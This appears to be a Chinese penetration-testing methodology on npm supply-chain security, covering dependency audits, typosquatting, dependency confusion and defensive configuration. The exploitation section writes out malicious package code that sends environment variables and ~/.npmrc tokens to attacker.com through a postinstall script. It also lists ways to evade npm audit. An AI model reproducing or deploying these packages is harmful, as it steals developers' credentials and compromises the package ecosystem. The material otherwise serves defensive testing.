# npm 供应链安全测试方法论

---

# 第一部分：文档概述

## 1.1 编写目的
- 为渗透测试人员提供 npm 供应链安全测试的系统化方法
- 指导测试人员识别 Node.js 项目依赖链中的安全风险
- 帮助理解 npm 生态系统中的攻击面和防御措施

## 1.2 适用范围
- 适用于使用 npm/yarn/pnpm 的 Node.js 项目
- 适用于使用 npm Registry 或私有 npm 仓库的场景
- 适用于前端、后端（Node.js）、React Native 等 JavaScript 项目

## 1.3 读者对象
- 渗透测试工程师
- Node.js 开发人员
- 前端安全工程师
- DevSecOps 工程师

---

# 第二部分：核心渗透技术专题

## 专题一：npm 供应链安全测试

### 2.1 技术介绍

npm 供应链安全测试是指对 Node.js 项目的 npm 依赖进行系统性安全评估，识别依赖项中的已知漏洞、恶意包、过度权限、可疑脚本等安全风险，确保项目依赖链的完整性和可信性。

**npm 供应链架构：**

```
┌─────────────────────────────────────────────────────────────┐
│                    npm 供应链架构                            │
├─────────────────────────────────────────────────────────────┤
│  开发者                                                     │
│    │ npm install                                            │
│    ▼                                                        │
│  package.json (声明依赖)                                     │
│    │                                                        │
│    ▼                                                        │
│  npm Registry (公共/私有)                                    │
│    │ 下载包                                                 │
│    ▼                                                        │
│  node_modules (安装依赖)                                     │
│    │ postinstall 脚本执行                                   │
│    ▼                                                        │
│  应用运行                                                   │
└─────────────────────────────────────────────────────────────┘
```

**常见安全问题：**

| 问题类型 | 描述 | 危害等级 |
|---------|------|---------|
| 已知漏洞 | 依赖包存在 CVE 漏洞 | 高 |
| 恶意包 | 包含恶意代码的 npm 包 | 严重 |
| Typosquatting | 包名拼写相似的恶意包 | 高 |
| 依赖混淆 | 公共包名与内部包冲突 | 高 |
| 恶意脚本 | postinstall 脚本执行恶意代码 | 严重 |
| 凭证泄露 | .npmrc 包含认证信息 | 高 |
| 过度权限 | 包请求不必要的权限 | 中 |
| 维护者风险 | 包维护者账户被盗 | 高 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 新项目初始化 | npm install | 直接安装未审查的依赖 |
| 依赖更新 | npm update | 更新到恶意版本 |
| CI/CD 构建 | npm ci | 自动安装所有依赖 |
| 开源项目 | 接受外部 PR 修改依赖 | PR 可能添加恶意依赖 |
| 私有包发布 | npm publish | 可能发布恶意包 |
| 脚本执行 | npm run script | 可能执行恶意脚本 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：识别项目依赖**
```bash
# 检查 package.json
curl https://target.com/package.json

# 检查依赖版本
{
  "dependencies": {
    "express": "^4.17.1",
    "lodash": "^4.17.20"  // 检查是否有漏洞
  },
  "devDependencies": {
    "webpack": "^5.0.0"
  }
}
```

**步骤二：检查公开凭证**
```bash
# 检查 .npmrc 是否可访问
curl https://target.com/.npmrc

# 检查是否包含认证信息
//registry.npmjs.org/:_authToken=npm_xxxxx
```

**步骤三：漏洞扫描**
```bash
# 使用 npm audit
npm audit

# 使用 audit-ci
npx audit-ci --moderate

# 使用 Snyk
npx snyk test
```

#### 2.3.2 白盒测试

**步骤一：审计依赖树**
```bash
# 查看完整依赖树
npm ls --all

# 检查重复依赖
npm ls <package-name>

# 检查过时的依赖
npm outdated
```

**步骤二：检查 package.json 脚本**
```json
{
  "scripts": {
    "postinstall": "node scripts/postinstall.js",
    "prepublish": "npm run build",
    "start": "node server.js"
  }
}

# 检查脚本内容
cat scripts/postinstall.js
```

**步骤三：检查依赖包内容**
```bash
# 检查包的 postinstall 脚本
cat node_modules/package-name/package.json | jq '.scripts'

# 检查包的可疑文件
find node_modules/package-name -name "*.js" -exec grep -l "child_process\|https\|fs" {} \;

# 检查包的网络请求
grep -r "https.get\|axios\|request" node_modules/package-name/
```

### 2.4 漏洞利用方法

#### 2.4.1 Typosquatting 攻击

```bash
# 1. 识别流行包
# react, lodash, express, axios 等

# 2. 注册相似名称的包
# react -> reeact, r3act, reactjs
# lodash -> lodash-utils, lodash-helper

# 3. 发布恶意包
npm init -y
# name: "lodahs"  # 拼写错误
echo "module.exports = require('lodash'); require('https').get('http://attacker.com/exfil')" > index.js
npm publish
```

#### 2.4.2 依赖混淆攻击

```bash
# 1. 识别内部包名
# 通过源码、错误信息、文档

# 2. 在公共 npm 注册相同包名
npm init -y
# name: "company-internal-utils"

# 3. 添加恶意代码
echo "require('child_process').exec('curl http://attacker.com?d=' + process.cwd())" > index.js

# 4. 发布到公共仓库
npm publish

# 5. 如果目标配置不当，会从公共仓库拉取
```

#### 2.4.3 恶意脚本执行

```json
// package.json
{
  "name": "useful-package",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node install.js"
  }
}
```

```javascript
// install.js
const https = require('https');
const { exec } = require('child_process');

// 窃取环境变量
const env = JSON.stringify(process.env);
https.get(`http://attacker.com/exfil?env=${encodeURIComponent(env)}`);

// 窃取 .npmrc
const fs = require('fs');
try {
  const npmrc = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');
  https.get(`http://attacker.com/exfil?npmrc=${encodeURIComponent(npmrc)}`);
} catch(e) {}
```

#### 2.4.4 凭证窃取

```bash
# 1. 窃取 npm 凭证
# ~/.npmrc 包含 _authToken

# 2. 窃取其他凭证
# AWS, GCP, Azure 等云凭证

# 3. 使用窃取的凭证
# 发布恶意包或访问私有仓库
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过 npm audit

```bash
# 1. npm audit 只扫描已知漏洞
# 恶意包可能不在数据库中

# 2. 使用代码混淆
# 隐藏恶意代码

# 3. 延迟执行
# 安装时不执行，运行时才执行
```

#### 2.5.2 绕过锁文件

```bash
# 1. 如果目标删除了 lock 文件
# 重新安装可能获取新版本

# 2. 如果目标运行 npm update
# 会更新到最新兼容版本

# 3. 利用依赖范围
# ^1.0.0 会安装 1.x 最新版本
```

---

# 第三部分：附录

## 3.1 npm 安全检测命令

```bash
# 安全审计
npm audit
npm audit --json

# 检查包内容
npm view package-name
npm view package-name --json

# 检查依赖树
npm ls --all --depth=0

# 检查过时依赖
npm outdated

# 验证包完整性
npm ci --ignore-scripts  # 不执行脚本
```

## 3.2 npm 安全配置

```bash
# 禁用脚本执行
npm config set ignore-scripts true

# 设置严格 SSL
npm config set strict-ssl true

# 使用私有仓库
npm config set registry https://private-registry.com

# 保存凭证时加密
npm config set //registry.npmjs.org/:_authToken=$TOKEN
```

## 3.3 恶意包检测指标

| 指标 | 检测方法 | 风险等级 |
|-----|---------|---------|
| 新发布的包 | 检查发布时间 | 中 |
| 下载量极低 | npm view downloads | 中 |
| 维护者单一 | npm view maintainers | 中 |
| 包含 postinstall | 检查 scripts | 高 |
| 代码混淆 | 检测混淆模式 | 高 |
| 网络请求 | 检测 https 调用 | 高 |
| 系统命令 | 检测 child_process | 严重 |

## 3.4 安全工具

| 工具名称 | 用途 | 链接 |
|---------|------|------|
| npm audit | npm 内置安全审计 | npm 内置 |
| audit-ci | CI 中的 npm audit | https://github.com/IBM/audit-ci |
| snyk | 依赖安全扫描 | https://snyk.io/ |
| lockfile-lint | 锁文件完整性检查 | https://github.com/lirantal/lockfile-lint |
| socket.dev | npm 包安全分析 | https://socket.dev/ |

---

## 参考资源

- [npm Security Documentation](https://docs.npmjs.com/cli/v6/using-npm/security)
- [npm Blog - Security Advisories](https://blog.npmjs.org/)
- [Snyk npm Vulnerability Database](https://snyk.io/vuln/npm)
- [Socket.dev npm Security](https://socket.dev/)
